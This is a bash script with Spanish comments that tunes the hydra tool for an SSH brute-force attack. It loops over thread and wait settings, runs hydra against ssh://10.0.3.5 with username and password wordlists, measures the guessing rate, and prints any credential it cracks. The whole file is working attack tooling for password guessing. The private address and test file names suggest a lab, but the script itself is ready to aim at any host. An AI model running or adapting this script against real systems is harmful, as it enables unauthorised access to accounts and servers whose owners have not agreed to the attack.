#!/bin/bash

echo "=== BUSCANDO CONFIGURACIÓN ÓPTIMA ==="
echo ""

# Configuraciones a probar
configs=(
    "t=4 w=2"
    "t=4 w=3"
    "t=3 w=2"
    "t=3 w=3"
    "t=2 w=2"
    "t=2 w=3"
    "t=2 w=4"
    "t=1 w=2"
    "t=1 w=3"
)

for config in "${configs[@]}"; do
    t=$(echo $config | grep -oP 't=\K\d')
    w=$(echo $config | grep -oP 'w=\K\d')
    
    echo "Probando: -t $t -w $w"
    
    # Ejecutar por 30 segundos y capturar velocidad
    output=$(timeout 35 hydra -L usuarios_test.txt -P passwords_test.txt ssh://10.0.3.5 -t $t -w $w -v 2>&1)
    
    # Extraer tries/min
    speed=$(echo "$output" | grep -oP 'STATUS\].*\K\d+(\.\d+)?(?= tries/min)' | head -1)
    
    if [ -n "$speed" ]; then
        echo "  -> Velocidad: $speed tries/min"
    else
        echo "  -> Error o bloqueado"
    fi
    
    # Verificar si hubo éxito
    if echo "$output" | grep -q "password:"; then
        echo "  ✅ ¡CREDENCIAL ENCONTRADA!"
        echo "$output" | grep "password:"
    fi
    
    echo ""
    sleep 5
done
